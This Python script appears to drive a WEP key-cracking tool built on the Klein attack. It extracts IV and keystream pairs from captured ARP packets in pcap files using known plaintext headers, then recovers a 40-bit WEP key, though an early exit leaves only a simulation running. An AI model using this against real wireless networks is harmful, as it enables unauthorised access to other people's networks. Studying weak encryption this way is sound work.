import datetime

from pcap.pcap import PCAP
from wep_parser.wep import WEP
from wlan.wlan import IEEE802_11

from rc4.rc4 import test_keys
from utils import log
from wep.klein_attack import crack_wep, crack_simulation


def parse_pcap(filename):
    mypcap = PCAP(filename)
    pcaph = mypcap.header()
    known_headers = bytearray(
        [0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06, 0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01])

    iv_stream_pair = []
    for packet in mypcap:
        if packet['len'] == 68:
            iv, k, ciphertext, icv = WEP(IEEE802_11(packet['data']).get_payload()).get()
            stream_key = bytearray([a ^ b for (a, b) in zip(ciphertext, known_headers)])
            iv_stream_pair.append(dict(iv=iv, stream_key=stream_key))
    return iv_stream_pair

print(crack_simulation(tuple_amount=30000))
exit()


key_length = 40
n = 256

start = datetime.datetime.now()
key_length_bytes = int(key_length / 8)

# Retrieve sample set of bytearray tuples
log("Collection Key Stream ... ", level=0)

iv_stream_pair = []
iv_stream_pair = iv_stream_pair + parse_pcap("output-05.cap")
iv_stream_pair = iv_stream_pair + parse_pcap("output-03.cap")

tuple_amount = len(iv_stream_pair)

log("Key Stream collected after {}ms".format(int((datetime.datetime.now() - start).total_seconds() * 1000)),
    level=0)

# Crack wep by approximating main key bytes from (iv, stream cipher) pairs
log("Start Hacking {} ms".format(int((datetime.datetime.now() - start).total_seconds() * 1000)), level=0)
possible_key_set = crack_wep(iv_stream_pair=iv_stream_pair, key_length_bytes=key_length_bytes,
                             tuple_amount=tuple_amount, n=256)

ms_end = int((datetime.datetime.now() - start).total_seconds() * 1000)
s_end = int((datetime.datetime.now() - start).total_seconds())

key = test_keys(possible_key_set, (iv_stream_pair[0].get('iv'), iv_stream_pair[0].get('stream_key')))
if key:
    log("Key found after {}ms ({} seconds)".format(ms_end, s_end), level=0)
    print(key)
